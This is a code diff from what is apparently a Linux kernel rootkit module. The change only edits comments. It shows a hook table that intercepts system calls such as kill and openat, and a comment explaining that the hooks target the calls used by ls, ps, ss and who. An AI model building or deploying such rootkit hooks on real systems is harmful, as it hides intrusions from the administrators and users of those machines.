@@ -273,7 +273,9 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
     return len;
 }
 
-// List of system calls to hook :D
+/* I am not going for full coverage of every possible system call that should be tampered with
+ * in order to achieve our goals (because that would take eternity). Instead, this rootkit only
+ * messes with system calls that are used by the common Linux utils (ls, ps, ss, who...) */
 struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
@@ -288,7 +290,7 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
 };
 
-/* LKM initialization */
+// LKM initialization
 static int __init rooti_init(void)
 {
     ROOTI_DEBUG("init");
@@ -320,7 +322,7 @@ static int __init rooti_init(void)
     return 0;
 }
 
-/* LKM cleanup */
+// LKM cleanup
 static void __exit rooti_exit(void)
 {
     ROOTI_DEBUG("exit");
